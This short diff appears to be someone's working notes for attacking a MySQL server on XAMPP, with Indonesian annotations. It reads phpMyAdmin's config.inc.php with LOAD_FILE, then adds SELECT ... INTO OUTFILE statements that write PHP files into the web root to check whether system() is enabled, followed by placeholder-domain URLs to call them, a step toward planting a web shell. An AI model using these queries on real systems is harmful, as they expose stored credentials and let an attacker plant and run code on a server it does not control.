@@ -2,10 +2,22 @@
 SELECT LOAD_FILE('C:/xampp/phpmyadmin/config.inc.php');
 
 
+SELECT '<?php echo "Fungsi system: " . (function_exists("system") ? "AKTIF" : "MATI"); ?>' 
+INTO OUTFILE 'D:/xampp/htdocs/Web_Sci/public/logserver1.php';
+panggil
+https://www.dummy.co.id/logserver1.php
+https://www.dummy.co.id/Web_Sci/public/logserver1.php
 
-SELECT @@basedir;
 
-SELECT @@datadir;
+
+SELECT '<?php echo "Fungsi system: " . (function_exists("system") ? "AKTIF" : "MATI"); ?>' 
+INTO OUTFILE 'D:/xampp/htdocs/logserver.php';
+panggil
+https://www.dummy.co.id/logserver.php
+https://www.dummy.co.id/Web_Sci/public/logserver.php
+
+
+
 
 SHOW VARIABLES LIKE 'secure_file_priv';
 
